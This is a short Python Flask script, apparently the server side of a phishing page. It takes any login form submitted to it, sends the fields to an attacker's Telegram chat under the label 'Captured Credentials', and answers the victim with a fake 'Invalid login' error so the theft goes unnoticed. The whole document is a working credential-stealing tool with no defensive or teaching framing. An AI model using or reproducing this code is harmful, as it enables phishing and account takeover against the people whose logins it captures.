import requests
from flask import Flask, request

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"

def send_to_telegram(data):
    message = f"🔹 Captured Credentials:\n{data}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message})

@app.route("/", methods=["POST"])
def capture():
    credentials = request.form.to_dict()
    send_to_telegram(credentials)
    return "Error: Invalid login", 403

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
